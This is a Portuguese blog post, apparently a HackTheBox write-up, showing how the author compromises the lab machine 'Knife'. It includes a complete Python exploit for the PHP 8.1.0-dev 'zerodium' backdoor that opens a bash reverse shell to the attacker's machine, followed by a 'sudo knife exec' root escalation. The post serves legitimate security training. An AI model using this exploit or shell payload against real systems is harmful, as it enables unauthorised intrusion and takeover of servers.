@@ -1,0 +1,546 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="Haderach ">
+<meta name="description" content="Neste &amp;lsquo;writeup&amp;rsquo; veremos a resolução da máquina &amp;lsquo;Knife&amp;rsquo; do HackTheBox.
+Informações da Máquina IP: 10.10.10.242
+Sistema Operacional: Linux
+Nível de dificuldade: Easy
+Varredura e Enumeração Port Scan Duas portas abertas foram descobertas com o Nmap: 22 e 80. Abaixo o resultado do Nmap executando o scan com os scripts padrão.
+# Nmap 7.91 scan initiated Mon Jun 21 18:20:19 2021 as: nmap -v -sC -sV -p 22,80 -Pn -oN details." />
+<meta name="keywords" content="DCPT,Pentest,CTF,Cybersecurity,RedTeam,HackTheBox, writeup, hackthebox" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="#252627" />
+<link rel="canonical" href="https://brunomcuesta.github.io/posts/2021/08/hackthebox-knife/" />
+
+
+    <title>
+        
+            HackTheBox - Knife :: Haderach  — Pentest e CTF
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://brunomcuesta.github.io/main.031a8efc33f94f55a4071bf4e91596478a5809fc8c148fab113801189cfd2152.css">
+
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://brunomcuesta.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://brunomcuesta.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://brunomcuesta.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://brunomcuesta.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://brunomcuesta.github.io/safari-pinned-tab.svg" color="#252627">
+    <link rel="shortcut icon" href="https://brunomcuesta.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="#252627">
+    <meta name="theme-color" content="#252627">
+
+
+
+<meta itemprop="name" content="HackTheBox - Knife">
+<meta itemprop="description" content="Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Knife&rsquo; do HackTheBox.
+Informações da Máquina IP: 10.10.10.242
+Sistema Operacional: Linux
+Nível de dificuldade: Easy
+Varredura e Enumeração Port Scan Duas portas abertas foram descobertas com o Nmap: 22 e 80. Abaixo o resultado do Nmap executando o scan com os scripts padrão.
+# Nmap 7.91 scan initiated Mon Jun 21 18:20:19 2021 as: nmap -v -sC -sV -p 22,80 -Pn -oN details.">
+<meta itemprop="datePublished" content="2021-08-28T14:21:00-03:00" />
+<meta itemprop="dateModified" content="2021-08-28T14:21:00-03:00" />
+<meta itemprop="wordCount" content="940">
+<meta itemprop="image" content="https://brunomcuesta.github.io"/>
+
+
+
+<meta itemprop="keywords" content="writeup,hackthebox," />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://brunomcuesta.github.io"/>
+
+<meta name="twitter:title" content="HackTheBox - Knife"/>
+<meta name="twitter:description" content="Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Knife&rsquo; do HackTheBox.
+Informações da Máquina IP: 10.10.10.242
+Sistema Operacional: Linux
+Nível de dificuldade: Easy
+Varredura e Enumeração Port Scan Duas portas abertas foram descobertas com o Nmap: 22 e 80. Abaixo o resultado do Nmap executando o scan com os scripts padrão.
+# Nmap 7.91 scan initiated Mon Jun 21 18:20:19 2021 as: nmap -v -sC -sV -p 22,80 -Pn -oN details."/>
+
+
+
+
+    <meta property="og:title" content="HackTheBox - Knife" />
+<meta property="og:description" content="Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Knife&rsquo; do HackTheBox.
+Informações da Máquina IP: 10.10.10.242
+Sistema Operacional: Linux
+Nível de dificuldade: Easy
+Varredura e Enumeração Port Scan Duas portas abertas foram descobertas com o Nmap: 22 e 80. Abaixo o resultado do Nmap executando o scan com os scripts padrão.
+# Nmap 7.91 scan initiated Mon Jun 21 18:20:19 2021 as: nmap -v -sC -sV -p 22,80 -Pn -oN details." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://brunomcuesta.github.io/posts/2021/08/hackthebox-knife/" />
+<meta property="og:image" content="https://brunomcuesta.github.io"/>
+<meta property="article:published_time" content="2021-08-28T14:21:00-03:00" />
+<meta property="article:modified_time" content="2021-08-28T14:21:00-03:00" />
+
+
+
+
+
+
+    <meta property="article:published_time" content="2021-08-28 14:21:00 -0300 -03" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://brunomcuesta.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">></span>
+            <span class="logo__text">$ cd /root/</span>
+            <span class="logo__cursor" style=
+                  "
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://brunomcuesta.github.io/about/">About</a></li><li><a href="https://brunomcuesta.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        5 minutos
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://brunomcuesta.github.io/posts/2021/08/hackthebox-knife/">HackTheBox - Knife</a>
+      </h1>
+
+      
+
+      
+        <hr />
+        <aside id="toc">
+          <div class="toc-title">Índice</div>
+          <nav id="TableOfContents">
+  <ul>
+    <li><a href="#informações-da-máquina">Informações da Máquina</a></li>
+    <li><a href="#varredura-e-enumeração">Varredura e Enumeração</a>
+      <ul>
+        <li><a href="#port-scan">Port Scan</a></li>
+        <li><a href="#webserver">Webserver</a></li>
+      </ul>
+    </li>
+    <li><a href="#vulnerabilidade">Vulnerabilidade</a></li>
+    <li><a href="#exploração">Exploração</a></li>
+    <li><a href="#escalação-de-privilégios">Escalação de Privilégios</a></li>
+  </ul>
+</nav>
+        </aside>
+        <hr />
+
+      
+
+      <div class="post-content">
+        
+    <img src="https://i.imgur.com/x3iE4nH.jpg"  alt="Knife Cover"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Neste &lsquo;writeup&rsquo; veremos a resolução da máquina &lsquo;Knife&rsquo; do <a href="https://www.hackthebox.eu/">HackTheBox</a>.</p>
+<h2 id="informações-da-máquina">Informações da Máquina</h2>
+<p>IP: 10.10.10.242</p>
+<p>Sistema Operacional: Linux</p>
+<p>Nível de dificuldade: Easy</p>
+<h2 id="varredura-e-enumeração">Varredura e Enumeração</h2>
+<h3 id="port-scan">Port Scan</h3>
+<p>Duas portas abertas foram descobertas com o Nmap: 22 e 80.
+Abaixo o resultado do Nmap executando o scan com os scripts padrão.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#75715e"># Nmap 7.91 scan initiated Mon Jun 21 18:20:19 2021 as: nmap -v -sC -sV -p 22,80 -Pn -oN details.txt 10.10.10.242</span>
+Nmap scan report <span style="color:#66d9ef">for</span> 10.10.10.242
+Host is up <span style="color:#f92672">(</span>0.26s latency<span style="color:#f92672">)</span>.
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey: 
+|   <span style="color:#ae81ff">3072</span> be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e🆎22:0e:c0:ee <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 1a🇩🇪a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.41 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title:  Emergent Medical Idea
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+<span style="color:#75715e"># Nmap done at Mon Jun 21 18:20:41 2021 -- 1 IP address (1 host up) scanned in 22.53 seconds</span>
+</code></pre></div><h3 id="webserver">Webserver</h3>
+<p>O resultado do comando Nmap mostra a porta 80 aberta e ao acessar o ip da máquina é possível visualizar uma página html.</p>
+
+    <img src="https://i.imgur.com/gKGRBIR.png"  alt="Página Inicial"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Para acessar o site pelo seu domínio e não pelo seu ip basta inserir a linha correspondente ao arquivo /etc/hosts.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">10.10.10.242  knife.htb
+</code></pre></div><p>O site poderá ser acessado pela seguinte URL.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">http://knife.htb
+</code></pre></div><p>Ao examinar o código fonte da página nada foi encontrado. A enumeração de diretórios e arquivos também não mostrou nada relevante exposto pelo servidor, além da página principal. Isto indica que a vulnerabilidade pode estar em alguma tecnologia presente que não foi atualizada. Neste caso é necessário verificar a versão do que está sendo utilizado no host. Para esta tarefa foi utilizado o &lsquo;whatweb&rsquo;.</p>
+
+    <img src="https://i.imgur.com/UJ13k90.png"  alt="Whatweb"  class="center"  style="border-radius: 8px;"  />
+
+
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">http://10.10.10.242 <span style="color:#f92672">[</span><span style="color:#ae81ff">200</span> OK<span style="color:#f92672">]</span> Apache<span style="color:#f92672">[</span>2.4.41<span style="color:#f92672">]</span>, Country<span style="color:#f92672">[</span>RESERVED<span style="color:#f92672">][</span>ZZ<span style="color:#f92672">]</span>,
+HTML5, HTTPServer<span style="color:#f92672">[</span>Ubuntu Linux<span style="color:#f92672">][</span>Apache/2.4.41 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)]</span>,
+IP<span style="color:#f92672">[</span>10.10.10.242<span style="color:#f92672">]</span>, PHP<span style="color:#f92672">[</span>8.1.0-dev<span style="color:#f92672">]</span>, Script,
+Title<span style="color:#f92672">[</span>Emergent Medical Idea<span style="color:#f92672">]</span>, X-Powered-By<span style="color:#f92672">[</span>PHP/8.1.0-dev<span style="color:#f92672">]</span>
+
+</code></pre></div><p>A saída do comando mostra que o servidor roda um Apache/2.4.41 e a linguagem de programação utilizada é o PHP 8.1.0-dev.</p>
+<h2 id="vulnerabilidade">Vulnerabilidade</h2>
+<p>Buscando por vulnerabilidade nesta versão de PHP foi possível encontrar um exploit disponível no <a href="https://www.exploit-db.com/exploits/49933">ExploitDB</a>.</p>
+
+    <img src="https://i.imgur.com/XTP24m5.png"  alt="Whatweb"  class="center"  style="border-radius: 8px;"  />
+
+
+<h2 id="exploração">Exploração</h2>
+<p>O exploit consiste em um script python que envia um &lsquo;User-Agentt&rsquo; alterado, permitindo a execução de um RCE (Remote Code Execution) no host. Com o exploit é possível obter um shell interativo.</p>
+
+    <img src="https://i.imgur.com/0B8JQJQ.png"  alt="Exploit"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Listando o diretório &lsquo;home&rsquo; do usuário james:</p>
+
+    <img src="https://i.imgur.com/aGDKFF9.png"  alt="Home"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Apesar de ser útil para obter mais informações do host e inclusive a &lsquo;flag&rsquo; do user.txt na &lsquo;home&rsquo; do usuário james, a alteração do script para obter um &lsquo;reverse shell&rsquo; é o ideal. A linha do &ldquo;User-Agentt&rdquo; foi alterada, removendo o &ldquo;cmd&rdquo; como payload e colocando em seu lugar uma conexão reversa em bash passando como parâmetro o ip e porta da máquina local do atacante.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#75715e">#!/usr/bin/env python3</span>
+<span style="color:#f92672">import</span> os
+<span style="color:#f92672">import</span> re
+<span style="color:#f92672">import</span> requests
+
+host <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Enter the full host url (http://host/): &#34;</span>)
+ip <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Local IP: &#34;</span>)
+port <span style="color:#f92672">=</span> input(<span style="color:#e6db74">&#34;Local Port: &#34;</span>)
+request <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>Session()
+response <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get(host)
+
+<span style="color:#66d9ef">if</span> str(response) <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;&lt;Response [200]&gt;&#39;</span>:
+    <span style="color:#66d9ef">try</span>:
+        headers <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#34;User-Agent&#34;</span>: <span style="color:#e6db74">&#34;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&#34;</span>,
+        <span style="color:#e6db74">&#34;User-Agentt&#34;</span>: <span style="color:#e6db74">&#34;zerodiumsystem(&#39;/bin/bash -c </span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">bash -i &gt;&amp;/dev/tcp/{}/{} 0&gt;&amp;1</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#39;);&#34;</span><span style="color:#f92672">.</span>format(ip,port)
+        }
+        response <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>get(host, headers <span style="color:#f92672">=</span> headers, allow_redirects <span style="color:#f92672">=</span> False)
+    <span style="color:#66d9ef">except</span> (<span style="color:#a6e22e">KeyboardInterrupt</span>):
+        <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Exiting...&#34;</span>)
+        exit
+
+<span style="color:#66d9ef">else</span>:
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\r</span><span style="color:#e6db74">&#34;</span>)
+    <span style="color:#66d9ef">print</span>(response)
+    <span style="color:#66d9ef">print</span>(<span style="color:#e6db74">&#34;Host is not available, aborting...&#34;</span>)
+    exit
+</code></pre></div><p>Após executar o script informando o ip do host e o ip e porta da máquina local obtemos um &lsquo;reverse shell&rsquo;.</p>
+
+    <img src="https://i.imgur.com/UOKMFPe.png"  alt="Reverse Shell"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Obtendo a flag do user.txt:</p>
+
+    <img src="https://i.imgur.com/0hLN4jy.png"  alt="James flag"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Enumerando internamente o diretório /var/www/html apenas uma página index.html foi encontrada. Porém no diretório /opt podemos encontrar outros dois diretórios que pertencem a um software de terceiros (chef-workstation e opscode). Inclusive na &lsquo;home&rsquo; do usuário é possível verificar a existência do diretório oculto &ldquo;.chef&rdquo; com um arquivo &ldquo;credentials&rdquo;.</p>
+
+    <img src="https://i.imgur.com/uuTctBo.png"  alt="Chef"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Buscando por &lsquo;chef&rsquo; encontramos mais informações sobre este software na página do <a href="https://docs.chef.io/platform_overview/">desenvolvedor</a>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">Chef é uma empresa de automação. Desde sua fundação em 2008, reunimos
+desenvolvedores e administradores de sistema com nosso produto homônimo, Chef Infra.
+Com o passar dos anos, o que entendemos por automação se expandiu.
+Hoje, o Chef tem uma solução de automação completa para infraestrutura
+e aplicativos que o leva desde o desenvolvimento até a produção.
+</code></pre></div><p>Como se trata de um software de automação o mais provável é que o usuário james possa executar algum binário ou script com permissões de root e assim será possível escalar privilégio na máquina.</p>
+<h2 id="escalação-de-privilégios">Escalação de Privilégios</h2>
+<p>O primeiro passo é saber se o usuário james está incluído no &lsquo;sudoers&rsquo; e se possui alguma permissão específica para executar algum script ou binário.</p>
+
+    <img src="https://i.imgur.com/ARoPIT2.png"  alt="Sudo"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>A saída do comando mostra que o arquivo /usr/bin/knife pode ser executado pelo usuário james com permissão de root e sem a necessidade de informar a senha do usuário.</p>
+<p>Com o comando &lsquo;file&rsquo; descobrimos que o arquivo &lsquo;knife&rsquo; é na realidade um link simbólico para outro de mesmo nome dentro do diretório &lsquo;chef-workstation&rsquo;.</p>
+
+    <img src="https://i.imgur.com/EeHp6TH.png"  alt="File"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Portanto, o &lsquo;knife&rsquo; é um utilitário de automação do &lsquo;chef-workstation&rsquo; e para descobrir como usá-lo para escalar privilégio é necessário pesquisar no site do <a href="https://docs.chef.io/workstation/knife/">desenvolvedor</a>.</p>
+
+    <img src="https://i.imgur.com/5oJoPve.png"  alt="Knife"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>O parâmetro que permite a execução de scripts ruby ou algum comando do sistema é o <a href="https://docs.chef.io/workstation/knife_exec/">exec</a>.</p>
+
+    <img src="https://i.imgur.com/mbyGj3I.png"  alt="Knife Exec"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Pode ser visualizado também ao executar o arquivo e buscar no seu menú de opções:</p>
+
+    <img src="https://i.imgur.com/XYe0CVe.png"  alt="Knife Menú"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Este é o comando utilizado para obter root:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sudo knife exec --exec <span style="color:#e6db74">&#34;exec &#39;/bin/bash -i&#39;&#34;</span>
+</code></pre></div>
+    <img src="https://i.imgur.com/0bj2R32.png"  alt="Root"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Obtendo a flag do root:</p>
+
+    <img src="https://i.imgur.com/RIrn163.png"  alt="Root Flag"  class="center"  style="border-radius: 8px;"  />
+
+
+<p>Neste &lsquo;writeup&rsquo; foi demonstrado como invadir a máquina &lsquo;knife&rsquo; através da exploração de um software desatualizado (PHP) no servidor. Logo em seguida, com uma enumeração básica na máquina, foi descoberto que o usuário &lsquo;james&rsquo; pode executar um script (knife) com permissões de root, bastando que o &lsquo;script&rsquo; seja executado com o &lsquo;sudo&rsquo; e sem o uso de senha do usuário, o que é considerado uma falha de segurança.</p>
+<p>Até a próxima!</p>
+
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://brunomcuesta.github.io/tags/writeup/">writeup</a></span>
+        <span class="tag"><a href="https://brunomcuesta.github.io/tags/hackthebox/">hackthebox</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        940 Palavras
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          28-08-2021 14:21
+        
+
+         
+          
+        
+      </p>
+    </div>
+      <hr />
+      <div class="sharing-buttons">
+        
+<a class="resp-sharing-button__link" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f" target="_blank" rel="noopener" aria-label="" title="Share on facebook">
+  <div class="resp-sharing-button resp-sharing-button--facebook resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://twitter.com/intent/tweet/?url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f" target="_blank" rel="noopener" aria-label="" title="Share on twitter">
+  <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
+      <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M23 3a10.9 10.9 0 0 1-3.14 1.53 4.48 4.48 0 0 0-7.86 3v1A10.66 10.66 0 0 1 3 4s-4 9 5 13a11.64 11.64 0 0 1-7 2c9 5 20 0 20-11.5a4.5 4.5 0 0 0-.08-.83A7.72 7.72 0 0 0 23 3z"></path></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.tumblr.com/widgets/share/tool?posttype=link&amp;title=HackTheBox%20-%20Knife&amp;caption=HackTheBox%20-%20Knife&amp;canonicalUrl=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f" target="_blank" rel="noopener" aria-label="" title="Share on tumblr">
+  <div class="resp-sharing-button resp-sharing-button--tumblr resp-sharing-button--small">
+    <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14.563 24c-5.093 0-7.031-3.756-7.031-6.411V9.747H5.116V6.648c3.63-1.313 4.512-4.596 4.71-6.469C9.84.051 9.941 0 9.999 0h3.517v6.114h4.801v3.633h-4.82v7.47c.016 1.001.375 2.371 2.207 2.371h.09c.631-.02 1.486-.205 1.936-.419l1.156 3.425c-.436.636-2.4 1.374-4.156 1.404h-.178l.011.002z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="mailto:?subject=HackTheBox%20-%20Knife&amp;body=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f" target="_self" rel="noopener" aria-label="" title="Share via email">
+  <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"></path><polyline points="22,6 12,13 2,6"></polyline></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://pinterest.com/pin/create/button/?url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f&amp;media=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f;description=HackTheBox%20-%20Knife" target="_blank" rel="noopener" aria-label="" title="Share on pinterest">
+  <div class="resp-sharing-button resp-sharing-button--pinterest resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12.017 0C5.396 0 .029 5.367.029 11.987c0 5.079 3.158 9.417 7.618 11.162-.105-.949-.199-2.403.041-3.439.219-.937 1.406-5.957 1.406-5.957s-.359-.72-.359-1.781c0-1.663.967-2.911 2.168-2.911 1.024 0 1.518.769 1.518 1.688 0 1.029-.653 2.567-.992 3.992-.285 1.193.6 2.165 1.775 2.165 2.128 0 3.768-2.245 3.768-5.487 0-2.861-2.063-4.869-5.008-4.869-3.41 0-5.409 2.562-5.409 5.199 0 1.033.394 2.143.889 2.741.099.12.112.225.085.345-.09.375-.293 1.199-.334 1.363-.053.225-.172.271-.401.165-1.495-.69-2.433-2.878-2.433-4.646 0-3.776 2.748-7.252 7.92-7.252 4.158 0 7.392 2.967 7.392 6.923 0 4.135-2.607 7.462-6.233 7.462-1.214 0-2.354-.629-2.758-1.379l-.749 2.848c-.269 1.045-1.004 2.352-1.498 3.146 1.123.345 2.306.535 3.55.535 6.607 0 11.985-5.365 11.985-11.987C23.97 5.39 18.592.026 11.985.026L12.017 0z"/></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f&amp;title=HackTheBox%20-%20Knife&amp;summary=HackTheBox%20-%20Knife&amp;source=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f" target="_blank" rel="noopener" aria-label="" title="Share on linkedin">
+  <div class="resp-sharing-button resp-sharing-button--linkedin resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
+    </div>
+  </div>
+</a>
+
+
+<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2fbrunomcuesta.github.io%2fposts%2f2021%2f08%2fhackthebox-knife%2f&amp;resubmit=true&amp;title=HackTheBox%20-%20Knife" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
+  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
